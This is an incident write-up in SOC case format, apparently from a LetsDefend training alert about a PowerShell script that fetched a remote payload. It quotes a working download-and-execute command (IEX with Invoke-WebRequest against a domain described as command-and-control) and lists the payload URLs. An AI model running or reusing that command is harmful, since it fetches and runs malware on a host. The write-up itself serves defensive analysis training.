---
type: soc-case
platform: letsdefend
status: closed
severity: Medium
tags:
  - mitre/T1059-001
  - mitre/T1105
  - mitre/T1071
  - powershell
date: 2026-03-16
MITRE ATT&CK:
outcome: true-positive
alert_id: SOC153
title: Suspicious Powershell Script Executed
youtube: https://www.youtube.com/watch?v=chlNqbtBWnk
---

T1059.001 PowerShell
T1105 Ingress Tool Transfer
T1071 Application Layer Protocol

### 👤 Who
Malicious activity was detected on host Tony (IP address 172.16.17.206). The endpoint executed a suspicious PowerShell script downloaded by the user from an external source.

### 🔎 What
The alert SOC153 Suspicious Powershell Script Executed triggered after the script payload_1.ps1 (hash db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0) was executed from the user's Downloads directory. Analysis of the command line logs shows PowerShell executed a remote script using the command:

"C:\Windows\system32\cmd.exe" /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')"

This command downloads and executes additional malicious code directly from the remote server. Threat intelligence confirms the domain kionagranada.com is associated with command and control infrastructure. VirusTotal analysis also confirms the hash of the downloaded script is malicious and classified as a trojan.

### 🕐 When
Mar 14 2024 05:23 PM

### 📍 Where
Hostname: Tony
Source IP Address: 172.16.17.206
Initial script location: C:\Users\LetsDefend\Downloads\payload_1.ps1
Remote payload source: https://kionagranada.com/upload/sd2.ps1
Initial download source: https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1

### 💡 Why
The alert was triggered due to execution of a suspicious PowerShell script attempting to download and execute additional payloads from an external server. Investigation confirmed the script attempted to establish communication with a malicious command and control domain. Endpoint protection detected the activity and the system was isolated to prevent further malicious execution or lateral movement. The alert is classified as a true positive malware infection attempt.